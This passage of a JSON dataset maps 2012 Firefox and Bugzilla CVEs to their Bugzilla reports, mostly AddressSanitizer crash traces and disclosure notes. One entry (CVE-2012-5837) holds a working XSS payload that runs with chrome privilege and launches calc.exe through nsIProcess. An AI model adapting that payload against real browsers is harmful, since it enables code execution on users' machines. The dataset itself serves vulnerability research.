ASAN:SIGSEGV ==3966== ERROR: AddressSanitizer crashed on unknown address 0x000012345678 (pc 0x7fff92c82a41 sp 0x7fff5fbf5380 bp 0x7fff5fbf5380 T0) AddressSanitizer can not provide additional info. ABORTING #0 0x7fff92c82a40 in memmove$VARIANT$sse42 (in libsystem_c.dylib) + 227 #1 0x100009291 in wrap_memmove (in firefox) + 545 #2 0x13add8981 in glDeleteBuffers_Exec (in GLEngine) + 1727 #3 0x105d41d4a in mozilla::gl::GLContext::fBufferSubData(unsigned int, long, long, void const*) (in XUL) + 90 #4 0x105d25b2f in mozilla::WebGLContext::BufferSubData(unsigned int, long long, mozilla::dom::TypedArray_base<unsigned char, &(JS_GetObjectAsArrayBufferView(JSContext*, JSObject*, unsigned int*, unsigned char**))>&) (in XUL) + 575"
      }
    ],
    "CVE-2012-5836": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=792857",
        "title": "SVG text on path + setting a style crashes Firefox",
        "description": "User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1 Build ID: 20120908010631 Steps to reproduce: Start with SVG with text on a path. Make sure there is an earlier sibling in the svg's parent element. Set a parent container to have a relative position. Firefox crashes. Pull up the attached html file and click \"Crash Firefox\" to reproduce it. Actual results: Firefox crashes. A cursory look in gdb indicates it's somewhere deep in the xul libraries. Reproduced on Firefox 15.0.1 Linux and Mac and Firefox 16b3 Linux. Expected results: The style should be set correctly and Firefox does not crash."
      }
    ],
    "CVE-2012-5837": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=800363",
        "title": "XSS in Web Developer Toolbar's chrome privilege page",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.0; rv:16.0) Gecko/20100101 Firefox/16.0 Build ID: 20121005155445 Steps to reproduce: 1. Open Developer Toolbar(Shift+F2). 2. Copy and paste <img src=\"x\" onerror=\"alert(1)\"> to toolbar input box.(Whitepaces are Tab chars) 3. You can see \"1\" from chrome:// URI. This means JavaScript is run as chrome privilege. The following code runs calc.exe on Windows. <img src=\"x\" onerror=\"file=Components.classes['@mozilla.org/file/local;1'].createInstance(Components.interfaces.nsILocalFile);file.initWithPath('C:\\\\\\\\windows\\\\\\\\system32\\\\\\\\calc.exe');process=Components.classes['@mozilla.org/process/util;1'].createInstance(Components.interfaces.nsIProcess);process.init(file);process.run(false,'','');\"> Expected results: JavaScript should not be run."
      }
    ],
    "CVE-2012-5838": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=802778",
        "title": "crash in copyTexImage2D with image dimensions too large for given level",
        "description": "similar to https://bugzilla.mozilla.org/show_bug.cgi?id=785734 on intel copyTexImage2D with a level of 9 or 10 and width and height that when multiplied come close to 2<<level, causes crashes, ==3424== ERROR: AddressSanitizer crashed on unknown address 0x0c0800010000 (pc 0x7f40953a8d69 sp 0x7fff9cd4cf28 bp 0x7f409b106080 T0) ==3455== ERROR: AddressSanitizer crashed on unknown address 0x000000000219 (pc 0x7f4410ea8009 sp 0x7fff39b3a900 bp 0x7f4416c21c80 T0) ==3484== ERROR: AddressSanitizer crashed on unknown address 0x300400008000 (pc 0x7f2f643a8d69 sp 0x7fffc23d1648 bp 0x7f2f6a921480 T0) ==3673== ERROR: AddressSanitizer crashed on unknown address 0x060a00008000 (pc 0x7f552b0a8d69 sp 0x7fff0c6814a8 bp 0x7f5530e07480 T0) ==3703== ERROR: AddressSanitizer crashed on unknown address 0x0c0800008000 (pc 0x7f3ee3da8d69 sp 0x7fffc3351cc8 bp 0x7f3ee9b22080 T0) ==3893== ERROR: AddressSanitizer crashed on unknown address 0x000100000251 (pc 0x7f1e3f2a6526 sp 0x7fff9cf2a070 bp 0x7f1e3f550140 T0)"
      }
    ],
    "CVE-2012-5839": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=804927",
        "title": "heap-buffer-overflow in gfxShapedWord::CompressedGlyph::IsClusterStart",
        "description": "Reproduces on trunk. ================================================================= ==18316== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f564317a4c8 at pc 0x7f56663d9456 bp 0x7fff810a54f0 sp 0x7fff810a54e8 READ of size 4 at 0x7f564317a4c8 thread T0 #0 0x7f56663d9455 in gfxShapedWord::CompressedGlyph::IsClusterStart() const ../../dist/include/gfxFont.h:1920 #1 0x7f56663225e9 in gfxTextRun::IsClusterStart(unsigned int) ../../dist/include/gfxFont.h:2383 #2 0x7f5666377101 in CountCharsFit(gfxTextRun*, unsigned int, unsigned int, double, PropertyProvider*, double*) layout/generic/nsTextFrameThebes.cpp:6128 #3 0x7f5666375ac4 in nsTextFrame::GetCharacterOffsetAtFramePointInternal(nsPoint const&, bool) layout/generic/nsTextFrameThebes.cpp:6171 #4 0x7f5666375047 in nsTextFrame::CalcContentOffsetsFromFramePoint(nsPoint) layout/generic/nsTextFrameThebes.cpp:6144 #5 0x7f5665f6051d in nsIFrame::GetContentOffsetsFromPoint(nsPoint, unsigned int) layout/generic/nsFrame.cpp:3643 #6 0x7f5665f5cde3 in nsFrame::HandlePress(nsPresContext*, nsGUIEvent*, nsEventStatus*) layout/generic/nsFrame.cpp:2714 #7 0x7f5665f56c27 in nsFrame::HandleEvent(nsPresContext*, nsGUIEvent*, nsEventStatus*) layout/generic/nsFrame.cpp:2401 #8 0x7f5665c259ae in nsPresShellEventCB::HandleEvent(nsEventChainPostVisitor&) layout/base/nsPresShell.cpp:492 #9 0x7f5668432cc3 in nsEventTargetChainItem::HandleEventTargetChain(nsEventChainPostVisitor&, unsigned int, nsDispatchingCallback*, bool, nsCxPusher*) content/events/src/nsEventDispatcher.cpp:362 #10 0x7f5668437f82 in nsEventDispatcher::Dispatch(nsISupports*, nsPresContext*, nsEvent*, nsIDOMEvent*, nsEventStatus*, nsDispatchingCallback*, nsCOMArray<nsIDOMEventTarget>*) content/events/src/nsEventDispatcher.cpp:629 #11 0x7f5665be315f in PresShell::HandleEventInternal(nsEvent*, nsEventStatus*) layout/base/nsPresShell.cpp:6474 #12 0x7f5665bdce63 in PresShell::HandlePositionedEvent(nsIFrame*, nsGUIEvent*, nsEventStatus*) layout/base/nsPresShell.cpp:6223 #13 0x7f5665bd4dbf in PresShell::HandleEvent(nsIFrame*, nsGUIEvent*, bool, nsEventStatus*) layout/base/nsPresShell.cpp:6022 #14 0x7f56699dc0f9 in nsViewManager::DispatchEvent(nsGUIEvent*, nsIView*, nsEventStatus*) view/src/nsViewManager.cpp:771 #15 0x7f56699c7817 in nsView::HandleEvent(nsGUIEvent*, bool) view/src/nsView.cpp:1068 #16 0x7f56699c7be1 in non-virtual thunk to nsView::HandleEvent(nsGUIEvent*, bool) :? #17 0x7f566f348c7a in nsWindow::DispatchEvent(nsGUIEvent*, nsEventStatus&) widget/gtk2/nsWindow.cpp:458 #18 0x7f566f37c3b1 in nsWindow::OnButtonPressEvent(_GtkWidget*, _GdkEventButton*) widget/gtk2/nsWindow.cpp:2729 #19 0x7f566f393349 in button_press_event_cb(_GtkWidget*, _GdkEventButton*) widget/gtk2/nsWindow.cpp:5256 #20 0x7f566020cdd7 in ?? ??:0 0x7f564317a4c8 is located 0 bytes to the right of 136-byte region [0x7f564317a440,0x7f564317a4c8) allocated by thread T0 here: #0 0x4c3e10 in malloc ??:? #1 0x7f5680d4b866 in moz_malloc memory/mozalloc/mozalloc.cpp:64 #2 0x7f56721dffbb in gfxTextRun::AllocateStorageForTextRun(unsigned long, unsigned int) gfx/thebes/gfxFont.cpp:4469 #3 0x7f56721c30dd in gfxTextRun::Create(gfxTextRunFactory::Parameters const*, unsigned int, gfxFontGroup*, unsigned int) gfx/thebes/gfxFont.cpp:4486 #4 0x7f56721c69f9 in gfxFontGroup::MakeTextRun(unsigned char const*, unsigned int, gfxTextRunFactory::Parameters const*, unsigned int) gfx/thebes/gfxFont.cpp:3531 #5 0x7f5666308b9e in gfxTextRun* MakeTextRun<unsigned char>(unsigned char const*, unsigned int, gfxFontGroup*, gfxTextRunFactory::Parameters const*, unsigned int) layout/generic/nsTextFrameThebes.cpp:552 #6 0x7f56662fd9fb in BuildTextRunsScanner::BuildTextRunForFrames(void*) layout/generic/nsTextFrameThebes.cpp:2049 #7 0x7f56662f2977 in BuildTextRunsScanner::FlushFrames(bool, bool) layout/generic/nsTextFrameThebes.cpp:1408 #8 0x7f5666316a21 in BuildTextRuns(gfxContext*, nsTextFrame*, nsIFrame*, nsLineList_iterator const*, nsTextFrame::TextRunType) layout/generic/nsTextFrameThebes.cpp:1336 Shadow byte and word: 0x1feac862f499: fb 0x1feac862f498: 00 fb fb fb fb fb fb fb More shadow bytes: 0x1feac862f478: fd fd fd fd fd fd fd fd 0x1feac862f480: fa fa fa fa fa fa fa fa 0x1feac862f488: 00 00 00 00 00 00 00 00 0x1feac862f490: 00 00 00 00 00 00 00 00 =>0x1feac862f498: 00 fb fb fb fb fb fb fb 0x1feac862f4a0: fa fa fa fa fa fa fa fa 0x1feac862f4a8: fd fd fd fd fd fd fd fd 0x1feac862f4b0: fd fd fd fd fd fd fd fd 0x1feac862f4b8: fd fd fd fd fd fd fd fd Stats: 268M malloced (261M for red zones) by 537106 calls Stats: 44M realloced by 25642 calls Stats: 237M freed by 307654 calls Stats: 204M really freed by 253059 calls Stats: 265M (67958 full pages) mmaped in 507 calls mmaps by size class: 7:221130; 8:47081; 9:13299; 10:6643; 11:7650; 12:1664; 13:896; 14:544; 15:144; 16:680; 17:452; 18:134; 19:35; 20:21; mallocs by size class: 7:380809; 8:92863; 9:25780; 10:10928; 11:16758; 12:3095; 13:1929; 14:1723; 15:343; 16:1260; 17:1370; 18:183; 19:42; 20:23; frees by size class: 7:193336; 8:64604; 9:19790; 10:7821; 11:13658; 12:2141; 13:1717; 14:1555; 15:289; 16:1173; 17:1353; 18:158; 19:39; 20:20; rfrees by size class: 7:163685; 8:49891; 9:15630; 10:4663; 11:12235; 12:1530; 13:1333; 14:1345; 15:244; 16:1098; 17:1289; 18:61; 19:37; 20:18; Stats: malloc large: 3221 small slow: 5781 ==18316== ABORTING"
      }
    ],
    "CVE-2012-5840": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=805287",
        "title": "Heap-use-after-free in nsTextEditorState::PrepareEditor",
        "description": "Reproduces on trunk. ================================================================= ==20748== ERROR: AddressSanitizer heap-use-after-free on address 0x7fec4cb70a60 at pc 0x7fec675d1dda bp 0x7fffdec77c10 sp 0x7fffdec77c08 READ of size 8 at 0x7fec4cb70a60 thread T0 #0 0x7fec675d1dd9 in nsCOMPtr<nsIEditor>::operator=(nsCOMPtr<nsIEditor> const&) ../../../../dist/include/nsCOMPtr.h:614 #1 0x7fec675c7820 in nsTextEditorState::PrepareEditor(nsAString_internal const*) content/html/content/src/nsTextEditorState.cpp:1210 #2 0x7fec675e5be8 in PrepareEditorEvent::Run() content/html/content/src/nsTextEditorState.cpp:1029 #3 0x7fec6623b72c in nsContentUtils::RemoveScriptBlocker() content/base/src/nsContentUtils.cpp:5015 #4 0x7fec646d13de in ~nsAutoScriptBlocker ../../../../dist/include/nsContentUtils.h:2332 #5 0x7fec646bcb26 in ~nsAutoScriptBlocker ../../../../dist/include/nsContentUtils.h:2331 #6 0x7fec64ae1ce2 in PresShell::FlushPendingNotifications(mozFlushType) layout/base/nsPresShell.cpp:3857 #7 0x7fec6522c622 in nsHideViewer::Run() layout/generic/nsSubDocumentFrame.cpp:775 #8 0x7fec6623b72c in nsContentUtils::RemoveScriptBlocker() content/base/src/nsContentUtils.cpp:5015 #9 0x7fec646d13de in ~nsAutoScriptBlocker ../../../../dist/include/nsContentUtils.h:2332 #10 0x7fec646bcb26 in ~nsAutoScriptBlocker ../../../../dist/include/nsContentUtils.h:2331 #11 0x7fec6646a7c2 in nsDocument::AdoptNode(nsIDOMNode*, nsIDOMNode**) content/base/src/nsDocument.cpp:5957 #12 0x7fec6bec6081 in nsIDOMDocument_AdoptNode(JSContext*, unsigned int, JS::Value*) objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:1391 #13 0x7fec77ff04e9 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) js/src/jscntxtinlines.h:364 #14 0x7fec77fa00e1 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) js/src/jsinterp.cpp:2369 #15 0x7fec77efef8e in js::RunScript(JSContext*, JS::Handle<JSScript*>, js::StackFrame*) js/src/jsinterp.cpp:324 #16 0x7fec77ffdced in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) js/src/jsinterp.cpp:510 #17 0x7fec77fff97b in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) js/src/jsinterp.cpp:547 #18 0x7fec7771447d in JS::Evaluate(JSContext*, JS::Handle<JSObject*>, JS::CompileOptions, unsigned short const*, unsigned long, JS::Value*) js/src/jsapi.cpp:5703 #19 0x7fec689cdf10 in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) dom/base/nsJSEnvironment.cpp:1499 #20 0x7fec68b8fb06 in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) dom/base/nsGlobalWindow.cpp:9740 #21 0x7fec68b43d84 in nsGlobalWindow::RunTimeout(nsTimeout*) dom/base/nsGlobalWindow.cpp:9999 #22 0x7fec68b8d9b8 in nsGlobalWindow::TimerCallback(nsITimer*, void*) dom/base/nsGlobalWindow.cpp:10266 #23 0x7fec70b33762 in nsTimerImpl::Fire() xpcom/threads/nsTimerImpl.cpp:472 #24 0x7fec70b34c6a in nsTimerEvent::Run() xpcom/threads/nsTimerImpl.cpp:555 #25 0x7fec70af70c6 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:620 #26 0x7fec7077746b in NS_ProcessNextEvent_P(nsIThread*, bool) objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #27 0x7fec6f04e446 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:82 #28 0x7fec70dd83e1 in MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:215 #29 0x7fec70dd8216 in MessageLoop::RunHandler() ipc/chromium/src/base/message_loop.cc:208 #30 0x7fec70dd80fb in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:182 #31 0x7fec6e463c8a in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:163 #32 0x7fec6cff4ab4 in nsAppStartup::Run() toolkit/components/startup/nsAppStartup.cpp:290 #33 0x7fec628d83e8 in XREMain::XRE_mainRun() toolkit/xre/nsAppRunner.cpp:3799 #34 0x7fec628de2cb in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:3866 #35 0x7fec628e11c4 in XRE_main toolkit/xre/nsAppRunner.cpp:3941 #36 0x40c055 in do_main(int, char**) browser/app/nsBrowserApp.cpp:174 #37 0x409757 in main browser/app/nsBrowserApp.cpp:279 #38 0x7fec81f6376c in ?? ??:0 0x7fec4cb70a60 is located 32 bytes inside of 128-byte region [0x7fec4cb70a40,0x7fec4cb70ac0) freed by thread T0 here: #0 0x4c3d50 in __interceptor_free ??:? #1 0x7fec7fce0406 in moz_free memory/mozalloc/mozalloc.cpp:48 #2 0x7fec6796dc86 in operator delete(void*) ../../../../dist/include/mozilla/mozalloc.h:224 #3 0x7fec6797cf99 in nsHTMLInputElement::HandleTypeChange(unsigned char) content/html/content/src/nsHTMLInputElement.cpp:2628 #4 0x7fec679b1fd4 in nsHTMLInputElement::ParseAttribute(int, nsIAtom*, nsAString_internal const&, nsAttrValue&) content/html/content/src/nsHTMLInputElement.cpp:2758 #5 0x7fec6666d1d9 in nsGenericElement::SetAttr(int, nsIAtom*, nsIAtom*, nsAString_internal const&, bool) content/base/src/nsGenericElement.cpp:1954 #6 0x7fec67538abd in nsGenericHTMLElement::SetAttr(int, nsIAtom*, nsIAtom*, nsAString_internal const&, bool) content/html/content/src/nsGenericHTMLElement.cpp:2002 #7 0x7fec6751c823 in nsGenericHTMLElement::SetAttr(int, nsIAtom*, nsAString_internal const&, bool) content/html/document/src/../../content/src/nsGenericHTMLElement.h:245 #8 0x7fec6751ec27 in nsGenericHTMLElement::SetAttrHelper(nsIAtom*, nsAString_internal const&) content/html/content/src/nsGenericHTMLElement.cpp:2871 #9 0x7fec6798c820 in nsHTMLInputElement::SetType(nsAString_internal const&) content/html/content/src/nsHTMLInputElement.cpp:905 #10 0x7fec6798c982 in non-virtual thunk to nsHTMLInputElement::SetType(nsAString_internal const&) :? #11 0x7fec6c4e71c1 in nsIDOMHTMLInputElement_SetType(JSContext*, JS::Handle<JSObject*>, JS::Handle<long>, int, JS::MutableHandle<JS::Value>) objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:13483 #12 0x7fec782d5d65 in js::CallJSPropertyOpSetter(JSContext*, int (*)(JSContext*, JS::Handle<JSObject*>, JS::Handle<long>, int, JS::MutableHandle<JS::Value>), JS::Handle<JSObject*>, JS::Handle<long>, int, JS::MutableHandle<JS::Value>) js/src/jscntxtinlines.h:450 #13 0x7fec7830c326 in js::baseops::SetPropertyHelper(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<long>, unsigned int, JS::MutableHandle<JS::Value>, int) js/src/jsobj.cpp:4613 #14 0x7fec78037376 in js::SetPropertyOperation(JSContext*, unsigned char*, JS::Handle<JS::Value>, JS::Handle<JS::Value>) js/src/jsinterpinlines.h:362 previously allocated by thread T0 here: #0 0x4c3e10 in malloc ??:? #1 0x7fec7fce055a in moz_xmalloc memory/mozalloc/mozalloc.cpp:54 #2 0x7fec6796c7aa in operator new(unsigned long) ../../../../dist/include/mozilla/mozalloc.h:200 #3 0x7fec6796b520 in NS_NewHTMLInputElement(already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) content/html/content/src/nsHTMLInputElement.cpp:538 #4 0x7fec68144d2f in CreateHTMLElement(unsigned int, already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) content/html/document/src/nsHTMLContentSink.cpp:497 #5 0x7fec6814558a in NS_NewHTMLElement(nsIContent**, already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) content/html/document/src/nsHTMLContentSink.cpp:480 #6 0x7fec667460f1 in NS_NewElement(nsIContent**, already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) content/base/src/nsNameSpaceManager.cpp:201 #7 0x7fec69ddd666 in nsHtml5TreeOperation::Perform(nsHtml5TreeOpExecutor*, nsIContent**) parser/html/nsHtml5TreeOperation.cpp:345 #8 0x7fec69dfe22b in nsHtml5TreeOpExecutor::RunFlushLoop() parser/html/nsHtml5TreeOpExecutor.cpp:564 Shadow byte and word: 0x1ffd8996e14c: fd 0x1ffd8996e148: fd fd fd fd fd fd fd fd More shadow bytes: 0x1ffd8996e128: 00 00 00 00 00 00 00 00 0x1ffd8996e130: 00 00 00 00 00 00 00 00 0x1ffd8996e138: fa fa fa fa fa fa fa fa 0x1ffd8996e140: fa fa fa fa fa fa fa fa =>0x1ffd8996e148: fd fd fd fd fd fd fd fd 0x1ffd8996e150: fd fd fd fd fd fd fd fd 0x1ffd8996e158: fa fa fa fa fa fa fa fa 0x1ffd8996e160: fa fa fa fa fa fa fa fa 0x1ffd8996e168: 00 00 00 00 00 00 00 00 Stats: 239M malloced (227M for red zones) by 420825 calls Stats: 43M realloced by 17471 calls Stats: 201M freed by 199819 calls Stats: 163M really freed by 165412 calls Stats: 248M (63708 full pages) mmaped in 474 calls mmaps by size class: 7:200655; 8:45034; 9:12276; 10:4599; 11:8670; 12:1152; 13:704; 14:544; 15:144; 16:616; 17:452; 18:112; 19:35; 20:21; mallocs by size class: 7:289609; 8:78837; 9:21511; 10:7139; 11:15529; 12:2157; 13:1652; 14:1478; 15:316; 16:1063; 17:1326; 18:146; 19:40; 20:22; frees by size class: 7:111546; 8:49507; 9:15454; 10:4185; 11:12566; 12:1338; 13:1217; 14:1311; 15:263; 16:1015; 17:1310; 18:51; 19:37; 20:19; rfrees by size class: 7:94468; 8:41302; 9:9580; 10:2979; 11:11409; 12:1056; 13:983; 14:1225; 15:217; 16:860; 17:1278; 18:49; 19:5; 20:1; Stats: malloc large: 2913 small slow: 4736 ==20748== ABORTING"
      }
    ],
    "CVE-2012-5841": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=805807",
        "title": "Filtering wrapper should filter setters when returning a property descriptor",
        "description": "Filing this so that I have a bug number for the mochitest I'm about to write. I'll fill in the details once I'm sure this is a problem."
      }
    ],
    "CVE-2012-5883": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=808845",
        "title": "[SECURITY] Security vulnerability in YUI's swfstore.swf in YUI 2.8.2 and 2.9.0",
        "description": "Bugzilla 3.6 has no SWF files in js/yui/ and so is not affected by the vulnerability described here. Bugzilla 4.0 and newer all have: md5sum ./swfstore/swfstore.swf 8526b66bd23fe8cebfa3426ad9c74ff0 This is the md5sum of swfstore.swf being released with YUI 2.8.0 - 2.8.2 (bug 606618). Per http://yuilibrary.com/support/20121030-vulnerability/, this SWF file is affected. Bugzilla 4.2 and newer were supposed to be fully upgraded to YUI 2.9.0 (bug 649879) which is not affected by this issue, and which has the following checksum: md5sum ./swfstore/swfstore.swf 844a3718c5f8c04ece6a86065a658a07 But this file has not been included in the list of updated files in bug 649879, and so we are still storing the file from YUI 2.8.x instead of the new one from YUI 2.9.0. Consequently, we are vulnerable to CVE-2012-5475. :( Attached is the patched swfstore.swf file for YUI 2.8.2 (Bugzilla 4.0): md5sum swfstore.swf 0114ab8c878ac4e48fd110f32164258b"
      }
    ],
    "CVE-2012-5884": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=697224",
        "title": "User.get should return a list of all your saved searches",
        "description": "It'd be really nice if we had access to a user's saved searches. This way we could allow users to create searches in bugzilla but have a client which can use them. Two additional methods would be needed. One to get a list of saved searches, and another one to execute a saved search. This would be exposed via the WebService using XMLRPC or JSONRPC."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=781850",
        "title": "[SECURITY] Do not leak the existence of groups when using User.get()",
        "description": "I just realized that User.get becomes way too verbose in Bugzilla 4.4. With a powerless account, I can access personal information, some of which power users shouldn't have access to either (even with admin or editusers privs): - (confidential) groups a user belongs to, bug 548198 (Bugzilla 4.0!) - unshared saved searches, bug 697224 (Bugzilla 4.4) This is totally unacceptable and this information must only be disclosed if you are querying your own account, i.e. the user ID matches Bugzilla->user->id. I know I approved bug 697224, but I didn't realize that all users could have access to this information. I clearly withdraw my approval here. Said differently, saved searches should never be disclosed to anyone but you. From the UI, admins have no way to get this information, except by impersonating the user account, in which case the user is informed by email that someone is looking at his account. So there is no reason that someone can have access to this information using User.get, even for admins. About groups, User.get is disclosing if a group exists or not, defeating CVE-2011-2380, see bug 653477. Bugzilla::Group->check_no_disclose() must be used instead of Bugzilla::Group->check()."
      }
    ]
  }
}